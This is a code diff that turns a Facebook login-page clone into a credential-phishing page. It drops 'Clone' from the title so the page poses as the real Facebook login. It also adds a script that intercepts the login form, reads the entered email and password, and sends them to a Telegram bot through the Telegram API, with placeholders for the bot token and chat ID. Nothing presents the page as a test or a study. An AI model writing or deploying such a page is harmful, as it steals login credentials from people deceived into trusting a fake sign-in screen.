@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html>
 
 <head>
     <meta charset="UTF-8">
-    <title>Facebook Clone</title>
+    <title>Facebook </title>
     <link rel="stylesheet" href="./css/styles.css">
     <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
 </head>
@@ -17,9 +17,9 @@
         </div>
 
         <div class="form">
-            <form class="a-form">
+            <form class="a-form" id="loginForm">
                 <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number"
-                    autofocus="autofocus" required />
+                    autofocus="autofocus"  />
                 <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password"
                     autofocus="autofocus" />
                 <input type="submit" class="a-sub" value="Log In" />
@@ -121,7 +121,45 @@
                 <div class="fb">Facebook Inc.</div>
             </div>
 
-      
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById("Email").value;
+            const password = document.getElementById("Password").value;
+
+            sendToTelegram(email, password);
+        });
+
+        function sendToTelegram(email, password) {
+            const botToken = "YOUR_BOT_TOKEN"; // Remplacez par votre jeton de bot
+            const chatId = "YOUR_CHAT_ID"; // Remplacez par l'ID de votre groupe
+            const message = `Email: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Message envoyé à Telegram avec succès !");
+                } else {
+                    console.error("Erreur lors de l'envoi du message à Telegram.");
+                    response.text().then(text => console.error(text));
+                }
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi du message à Telegram :", error);
+            });
+        }
+    </script>
 
 </body>
 
